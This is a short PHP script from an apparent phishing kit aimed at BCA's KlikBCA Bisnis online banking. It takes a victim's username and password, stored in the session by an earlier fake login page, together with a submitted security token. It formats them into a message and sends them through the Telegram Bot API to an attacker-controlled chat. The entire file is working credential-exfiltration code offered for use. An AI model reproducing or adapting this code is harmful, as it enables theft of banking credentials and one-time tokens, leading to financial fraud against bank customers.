<?php

session_start();
include "./telegram.php";


$token            = $_POST['token'];
$_SESSION['token'] = $token;

$txt_user_id        = $_SESSION['txt_user_id'];
$txt_pswd        = $_SESSION['txt_pswd'];

$message = "
──────────────────────
EXFY | BCA | KLIK BCA BISNIS :

• USERNAME : ".$txt_user_id."
• PASSWORD : ".$txt_pswd."
• TOKEN : ".$token."
──────────────────────";

function sendMessage($telegram_id, $message, $id_bot) {
    $url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

sendMessage($telegram_id, $message, $id_bot);

?>
